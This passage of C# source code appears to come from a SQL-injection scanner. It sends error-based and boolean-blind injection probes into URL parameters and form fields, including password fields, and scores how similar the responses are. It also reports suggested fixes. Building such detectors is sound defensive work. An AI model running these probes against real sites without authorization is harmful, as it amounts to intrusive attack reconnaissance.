        /// [0.0, 1.0] where 1.0 = identical length-and-shape. Deliberately NOT
        /// a full diff/Levenshtein (too expensive per-probe at scale) — this
        /// mirrors the lightweight length-ratio heuristic real-world blind-SQLi
        /// scanners use as a fast first-pass signal. Good enough to catch
        /// "this page returned a very different amount of content" without
        /// reading every byte.
        /// </summary>
        private static double SimilarityScore(string a, string b)
        {
            if (string.IsNullOrEmpty(a) && string.IsNullOrEmpty(b)) return 1.0;
            if (string.IsNullOrEmpty(a) || string.IsNullOrEmpty(b)) return 0.0;

            int lenA = a.Length, lenB = b.Length;
            double lengthRatio = (double)Math.Min(lenA, lenB) / Math.Max(lenA, lenB);

            // Light word-overlap check on top of length ratio so two
            // same-length-but-different-content pages don't score as similar.
            var wordsA = new System.Collections.Generic.HashSet<string>(
                a.Split((char[])null, StringSplitOptions.RemoveEmptyEntries));
            var wordsB = new System.Collections.Generic.HashSet<string>(
                b.Split((char[])null, StringSplitOptions.RemoveEmptyEntries));

            if (wordsA.Count == 0 && wordsB.Count == 0) return lengthRatio;

            int overlap = wordsA.Intersect(wordsB).Count();
            int union = wordsA.Union(wordsB).Count();
            double wordOverlap = union == 0 ? 1.0 : (double)overlap / union;

            return (lengthRatio + wordOverlap) / 2.0;
        }

        /// <summary>How many payload pairs to probe concurrently per param/field.
        /// Caps request burst so a 32-pair list doesn't slam the target with
        /// 64 simultaneous requests — still dramatically faster than the old
        /// fully-sequential loop while staying polite to the target server.</summary>
        private const int BooleanProbeConcurrency = 8;

        /// <summary>How similar TRUE/FALSE must be to baseline to count as "same page".</summary>
        private const double SimilarityThreshold = 0.92;

        // ════════════════════════════════════════════════════════════════════
        //  PROBE 1: URL query parameter
        // ════════════════════════════════════════════════════════════════════

        /// <summary>
        /// Appends a single quote to the given query param (e.g. "id") and
        /// checks the response for a DB error signature. Reports a single
        /// row via <paramref name="addRow"/>: (name, status, response).
        /// </summary>
        public static async Task ProbeUrlParamAsync(
            HttpClient http, string url, string param,
            Action<string, string, string> addRow,
            CancellationToken ct = default)
        {
            string payloadValue = "1" + Payload;
            string testUrl = url.Contains("?")
                ? $"{url}&{param}={Uri.EscapeDataString(payloadValue)}"
                : $"{url}?{param}={Uri.EscapeDataString(payloadValue)}";

            await RunSingleProbeAsync($"URL param ({param})", $"{param}={payloadValue}", testUrl, async () =>
            {
                var resp = await http.GetAsync(testUrl, ct);
                return await resp.Content.ReadAsStringAsync();
            }, addRow);
        }

        /// <summary>
        /// Boolean-based blind probe for a URL query parameter. Fetches a
        /// baseline (original value), a TRUE-condition payload, and a
        /// FALSE-condition payload, then compares response shapes. A page
        /// where TRUE looks like baseline but FALSE looks different (or vice
        /// versa) indicates the parameter reaches a WHERE clause even with no
        /// visible DB error — catches injectable fields that error-based
        /// detection misses entirely (custom error pages, caught exceptions).
        /// Reports one row per payload pair tested.
        /// </summary>
        public static async Task ProbeUrlParamBooleanAsync(
            HttpClient http, string url, string param, string originalValue,
            Action<string, string, string> addRow,
            CancellationToken ct = default)
        {
            string baselineUrl = BuildUrlWithParam(url, param, originalValue ?? "1");

            string baselineBody;
            try
            {
                var baseResp = await http.GetAsync(baselineUrl, ct);
                baselineBody = await baseResp.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                addRow($"URL param ({param}) [blind]", "❌ Error", "Baseline request failed: " + ex.Message);
                return;
            }

            // Each payload pair builds its own independent URL — no shared
            // mutable state — so these are safe to run concurrently. Throttled
            // so a 32-pair list doesn't fire 64 simultaneous requests at the
            // target all at once.
            var throttle = new SemaphoreSlim(BooleanProbeConcurrency);
            var tasks = BooleanPayloadPairs.Select(async pair =>
            {
                if (ct.IsCancellationRequested) return;
                await throttle.WaitAsync(ct);
                try
                {
                    string truePayloadFull = (originalValue ?? "1") + pair.True;
                    string falsePayloadFull = (originalValue ?? "1") + pair.False;
                    await RunBooleanPairAsync(
                        $"URL param ({param}) [blind: {DescribePayload(pair.True)}]",
                        $"{param}={truePayloadFull}", $"{param}={falsePayloadFull}",
                        baselineBody,
                        () => http.GetAsync(BuildUrlWithParam(url, param, truePayloadFull), ct),
                        () => http.GetAsync(BuildUrlWithParam(url, param, falsePayloadFull), ct),
                        addRow, ct);
                }
                finally { throttle.Release(); }
            });

            await Task.WhenAll(tasks);
        }

        private static string BuildUrlWithParam(string url, string param, string value)
        {
            string baseUrl = StripParam(url, param);
            string encoded = $"{param}={Uri.EscapeDataString(value)}";
            return baseUrl.Contains("?") ? $"{baseUrl}&{encoded}" : $"{baseUrl}?{encoded}";
        }

        /// <summary>Removes an existing occurrence of <paramref name="param"/> from the query string, if present.</summary>
        private static string StripParam(string url, string param)
        {
            int qIdx = url.IndexOf('?');
            if (qIdx < 0) return url;

            string baseUrl = url.Substring(0, qIdx);
            string query = url.Substring(qIdx + 1);
            var kept = query.Split('&')
                .Where(kv => !kv.StartsWith(param + "=", StringComparison.OrdinalIgnoreCase))
                .ToList();
            return kept.Count == 0 ? baseUrl : $"{baseUrl}?{string.Join("&", kept)}";
        }

        private static string DescribePayload(string truePayload) =>
            truePayload.Contains("'") ? "string" : truePayload.Contains("\"") ? "string\"" : "numeric";

        // ════════════════════════════════════════════════════════════════════
        //  PROBE 2: HTML forms on the page
        // ════════════════════════════════════════════════════════════════════

        /// <summary>
        /// Fetches <paramref name="url"/>, discovers every &lt;form&gt; on the
        /// page, and probes each text-like field one at a time (keeping all
        /// other fields, including CSRF tokens, at their normal value).
        /// Returns the number of fields tested.
        /// </summary>
        public static async Task<int> ProbeFormsAsync(
            HttpClient http, string url,
            Action<string, string, string> addRow,
            Action<string> addSep,
            CancellationToken ct = default)
        {
            string html;
            try
            {
                var resp = await http.GetAsync(url, ct);
                html = await resp.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                addRow("Form Fetch", "❌ Error", ex.Message);
                return 0;
            }

            var forms = FormParsingHelper.ParseForms(html, url);
            if (forms.Count == 0)
            {
                addRow("Forms", "ℹ️ None found", "No <form> elements detected on this page.");
                return 0;
            }

            addRow("Forms", "ℹ️ Found", $"{forms.Count} form(s) detected — testing text-like fields one at a time.");

            int fieldsTested = 0;
            foreach (var form in forms)
            {
                if (ct.IsCancellationRequested) break;

                addSep?.Invoke($"Form: {(string.IsNullOrWhiteSpace(form.Name) ? $"#{form.Index + 1}" : form.Name)}");
                addRow("Form Target", "ℹ️ Info",
                    $"{form.Method.ToUpper()} {form.Action} ({form.Fields.Count} fields, framework: {form.Framework})");

                var textFields = form.Fields
                    .Where(f => !f.IsCsrfToken &&
                                (f.Type == "text" || f.Type == "email" || f.Type == "search" ||
                                 f.Type == "password" || f.Type == "textarea" || f.Type == "tel" ||
                                 f.Type == "url" || string.IsNullOrEmpty(f.Type)))
                    .ToList();

                if (textFields.Count == 0)
                {
                    addRow(form.ToString(), "ℹ️ Skipped", "No text-like fields to test.");
                    continue;
                }

                foreach (var field in textFields)
                {
                    if (ct.IsCancellationRequested) break;
                    await ProbeFormFieldAsync(http, form, field, addRow, ct);
                    await ProbeFormFieldBooleanAsync(http, form, field, addRow, ct);
                    fieldsTested++;
                }
            }

            return fieldsTested;
        }

        /// <summary>
        /// Injects the probe payload into <paramref name="targetField"/> only,
        /// submits the form via its real method/action, and reports a single
        /// row via <paramref name="addRow"/>.
        /// </summary>
        public static async Task ProbeFormFieldAsync(
            HttpClient http,
            FormParsingHelper.FormInfo form, FormParsingHelper.FormField targetField,
            Action<string, string, string> addRow,
            CancellationToken ct = default)
        {
            var originalValue = targetField.Value;
            string injectedValue = (originalValue ?? "") + Payload;
            targetField.Value = injectedValue;
            string label = $"Form field: {targetField.Name}";

            try
            {
                await RunSingleProbeAsync(label, $"{targetField.Name}={injectedValue}", form.Action, async () =>
                {
                    HttpResponseMessage resp;
                    if (form.Method.Equals("GET", StringComparison.OrdinalIgnoreCase))
                    {
                        string qs = FormParsingHelper.BuildRequestBody(form, includeCsrfTokens: true);
                        string getUrl = form.Action.Contains("?") ? $"{form.Action}&{qs}" : $"{form.Action}?{qs}";
                        resp = await http.GetAsync(getUrl, ct);
                    }
                    else
                    {
                        string body = FormParsingHelper.BuildRequestBody(form, includeCsrfTokens: true);
                        var content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded");
                        resp = await http.PostAsync(form.Action, content, ct);
                    }
                    return await resp.Content.ReadAsStringAsync();
                }, addRow);
            }
            finally
            {
                targetField.Value = originalValue; // restore for next field's probe
            }
        }

        /// <summary>
        /// Boolean-based blind probe for a single form field. Submits the
        /// form three times per payload pair — baseline, TRUE condition,
        /// FALSE condition — with every other field held at its normal
        /// value, and compares response shapes the same way
        /// <see cref="ProbeUrlParamBooleanAsync"/> does. Catches injectable
        /// fields with no visible DB error.
        ///
        /// Request *bodies* are built up-front, one payload pair at a time
        /// (cheap, no I/O, so this stays single-threaded and safe even though
        /// it mutates the shared <paramref name="targetField"/>.Value).  Once
        /// every body string is captured, the actual HTTP requests fire in
        /// parallel (throttled) — by that point nothing mutates shared state
        /// anymore, so concurrent dispatch is safe.
        /// </summary>
        public static async Task ProbeFormFieldBooleanAsync(
            HttpClient http,
            FormParsingHelper.FormInfo form, FormParsingHelper.FormField targetField,
            Action<string, string, string> addRow,
            CancellationToken ct = default)
        {
            var originalValue = targetField.Value;
            string label = $"Form field: {targetField.Name} [blind]";
            bool isGet = form.Method.Equals("GET", StringComparison.OrdinalIgnoreCase);

            async Task<HttpResponseMessage> SendBodyAsync(string fieldValue)
            {
                targetField.Value = fieldValue;
                string body = FormParsingHelper.BuildRequestBody(form, includeCsrfTokens: true);
                targetField.Value = originalValue; // restore immediately — single-threaded section only

                if (isGet)
                {
                    string getUrl = form.Action.Contains("?") ? $"{form.Action}&{body}" : $"{form.Action}?{body}";
                    return await http.GetAsync(getUrl, ct);
                }
                else
                {
                    var content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded");
                    return await http.PostAsync(form.Action, content, ct);
                }
            }

            string baselineBody;
            try
            {
                var baseResp = await SendBodyAsync(originalValue);
                baselineBody = await baseResp.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                addRow(label, "❌ Error", "Baseline submission failed: " + ex.Message);
                return;
            }

            // SendBodyAsync mutates targetField.Value only for the instant it
            // takes to call BuildRequestBody, then restores it before the
            // await — so even though these run concurrently below, no two
            // calls can observe each other's in-flight mutation: the mutate
            // -> snapshot -> restore sequence is synchronous and atomic from
            // the scheduler's point of view (no await happens while the
            // field is in its "wrong" state).
            var throttle = new SemaphoreSlim(BooleanProbeConcurrency);
            var tasks = BooleanPayloadPairs.Select(async pair =>
            {
                if (ct.IsCancellationRequested) return;
                await throttle.WaitAsync(ct);
                try
                {
                    string truePayloadFull = (originalValue ?? "") + pair.True;
                    string falsePayloadFull = (originalValue ?? "") + pair.False;
                    await RunBooleanPairAsync(
                        $"{label}: {DescribePayload(pair.True)}",
                        $"{targetField.Name}={truePayloadFull}", $"{targetField.Name}={falsePayloadFull}",
                        baselineBody,
                        () => SendBodyAsync(truePayloadFull),
                        () => SendBodyAsync(falsePayloadFull),
                        addRow, ct);
                }
                finally { throttle.Release(); }
            });

            await Task.WhenAll(tasks);
        }

        // ════════════════════════════════════════════════════════════════════
        //  SHARED BOOLEAN-PAIR COMPARISON LOGIC
        // ════════════════════════════════════════════════════════════════════

        /// <summary>
        /// Sends the TRUE and FALSE requests, compares both against the
        /// baseline body, and reports a single row. Flags as a likely blind
        /// SQLi when TRUE behaves like baseline while FALSE diverges (or the
        /// reverse) — i.e. the response's *shape* tracks the injected logical
        /// condition, which a non-injectable field would never do since its
        /// value plays no role in query logic.
        ///
        /// <paramref name="truePayload"/> and <paramref name="falsePayload"/>
        /// are the literal strings sent (not just a description) — included
        /// in every reported row so the exact syntax is right there to
        /// copy-paste and manually re-test, instead of forcing a guess at
        /// what "string" or "numeric" actually meant.
        /// </summary>
        private static async Task RunBooleanPairAsync(
            string label, string truePayload, string falsePayload, string baselineBody,
            Func<Task<HttpResponseMessage>> sendTrue, Func<Task<HttpResponseMessage>> sendFalse,
            Action<string, string, string> addRow,
            CancellationToken ct)
        {
            try
            {
                var trueResp = await sendTrue();
                string trueBody = await trueResp.Content.ReadAsStringAsync();

                var falseResp = await sendFalse();
                string falseBody = await falseResp.Content.ReadAsStringAsync();

                double trueSim = SimilarityScore(baselineBody, trueBody);
                double falseSim = SimilarityScore(baselineBody, falseBody);
                double trueFalseSim = SimilarityScore(trueBody, falseBody);

                bool trueMatchesBaseline = trueSim >= SimilarityThreshold;
                bool falseMatchesBaseline = falseSim >= SimilarityThreshold;

                string payloadLine = $"  TRUE payload:  {truePayload}{Environment.NewLine}" +
                                      $"  FALSE payload: {falsePayload}";

                if (trueMatchesBaseline && !falseMatchesBaseline)
                {
                    addRow(label, "🚨 Possible blind SQLi",
                        $"TRUE condition matched baseline ({trueSim:P0} similar) but FALSE condition diverged " +
                        $"({falseSim:P0} similar) — response shape is tracking injected query logic.{Environment.NewLine}" +
                        $"{payloadLine}{Environment.NewLine}" +
                        "Fix: use parameterized queries / prepared statements; never concatenate user input into SQL.");
                }
                else if (!trueMatchesBaseline && falseMatchesBaseline)
                {
                    // Inverted but equally meaningful: FALSE matches baseline,
                    // TRUE diverges — still indicates the condition reaches the query.
                    addRow(label, "🚨 Possible blind SQLi",
                        $"FALSE condition matched baseline ({falseSim:P0} similar) but TRUE condition diverged " +
                        $"({trueSim:P0} similar) — response shape is tracking injected query logic (inverted pattern).{Environment.NewLine}" +
                        $"{payloadLine}{Environment.NewLine}" +
                        "Fix: use parameterized queries / prepared statements; never concatenate user input into SQL.");
                }
                else if (trueFalseSim < SimilarityThreshold && !trueMatchesBaseline && !falseMatchesBaseline)
                {
                    // Both differ from baseline AND from each other — input
                    // clearly affects output, but the binary TRUE/FALSE
                    // pattern alone doesn't confirm SQL logic. Worth a human
                    // look rather than a hard pass/fail.
                    addRow(label, "⚠️ Inconclusive",
                        $"Both TRUE and FALSE responses differ from baseline and from each other " +
                        $"(true={trueSim:P0}, false={falseSim:P0} similar to baseline) — input affects output, " +
                        $"but not in a clear boolean-logic pattern.{Environment.NewLine}" +
                        $"{payloadLine}{Environment.NewLine}" +
                        "Manual review recommended.");
                }
                else
                {
                    addRow(label, "✅ No disclosure",
                        "TRUE and FALSE conditions produced equivalent responses — no behavioral evidence " +
                        $"the input reaches query logic.{Environment.NewLine}{payloadLine}{Environment.NewLine}" +
                        "Does not rule out time-based or out-of-band blind injection.");
                }
            }
            catch (OperationCanceledException)
            {
                addRow(label, "⚠️ Timeout",
                    $"Boolean-blind probe timed out.{Environment.NewLine}  TRUE payload:  {truePayload}{Environment.NewLine}  FALSE payload: {falsePayload}");
            }
            catch (Exception ex)
            {
                addRow(label, "❌ Error",
                    $"{ex.Message}{Environment.NewLine}  TRUE payload:  {truePayload}{Environment.NewLine}  FALSE payload: {falsePayload}");
            }
        }

        // ════════════════════════════════════════════════════════════════════
        //  SHARED SINGLE-PROBE LOGIC (error-based)
        // ════════════════════════════════════════════════════════════════════

        private static async Task RunSingleProbeAsync(
            string label, string payload, string requestDescription, Func<Task<string>> sendRequest,
            Action<string, string, string> addRow)
        {
            try
            {
                string body = await sendRequest();
                var matched = FindErrorSignature(body);

                if (matched != null)
                {
                    addRow(label, "🚨 Possible SQLi",
                        $"DB error signature \"{matched}\" found. Likely unsanitized input reaching a SQL query.{Environment.NewLine}" +
                        $"  Payload sent: {payload}{Environment.NewLine}" +
                        "Fix: use parameterized queries / prepared statements, never concatenate user input into SQL; " +
                        "disable detailed error pages in production.");
                }
                else
                {
                    addRow(label, "✅ No disclosure",
                        $"No known DB error patterns found.{Environment.NewLine}  Payload sent: {payload}{Environment.NewLine}" +
                        "Passive check only — does not rule out blind/second-order injection.");
                }
            }
            catch (OperationCanceledException)
            {
                addRow(label, "⚠️ Timeout", $"Request to {requestDescription} timed out.{Environment.NewLine}  Payload sent: {payload}");
            }
            catch (Exception ex)
            {
                addRow(label, "❌ Error", $"{ex.Message}{Environment.NewLine}  Payload sent: {payload}");
            }
        }
    }
}